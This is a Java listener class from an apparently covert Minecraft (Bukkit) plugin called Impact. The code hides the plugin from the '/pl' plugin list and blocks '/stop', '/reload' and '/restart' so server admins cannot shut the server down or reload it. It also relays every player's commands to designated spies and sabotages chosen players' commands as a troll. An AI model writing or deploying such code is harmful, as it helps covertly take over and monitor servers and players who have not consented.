package de.impact.listeners;

import de.impact.commands.player.CommandSpy;
import de.impact.commands.trolling.FailCommand;
import de.impact.utils.ChatUtils;
import de.impact.utils.Locks;
import de.impact.utils.PluginUtils;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.UUID;

public class CommandListener implements Listener {

    private final List<String> pluginCommands = new ArrayList<>(Arrays.asList("/pl", "/bukkit:pl"));
    private final List<String> stopCommands = new ArrayList<>(Arrays.asList("/stop", "/rl", "/reload", "/restart", "/bukkit:rl", "/bukkit:reload"));

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e) {

        if(Locks.COMMANDS.isLocked())
            e.setCancelled(true);

        if(Locks.PLUGINLIST.isLocked())
            pluginCommands.forEach(c -> {
                if(e.getMessage().toLowerCase().startsWith(c)) {
                    e.setCancelled(true);
                    e.getPlayer().sendMessage(PluginUtils.getPluginListExceptImpact());
                }
            });

        if(Locks.STOP.isLocked())
            stopCommands.forEach(c -> {
                if(e.getMessage().toLowerCase().startsWith(c)) {
                    e.setCancelled(true);
                }
            });

        if(FailCommand.shouldFail(e.getPlayer().getUniqueId())) {
            e.setCancelled(true);
            e.getPlayer().chat(e.getMessage().replaceFirst("/", "7"));
            return;
        }

        for(UUID p : CommandSpy.getSpyPlayers()) {

            if(Bukkit.getPlayer(p) == null || Bukkit.getPlayer(p).equals(e.getPlayer())) continue;

            ChatUtils.sendMessage(Bukkit.getPlayer(p), e.getPlayer().getName() + " has ran a command: §a" + e.getMessage());
        }

    }
}
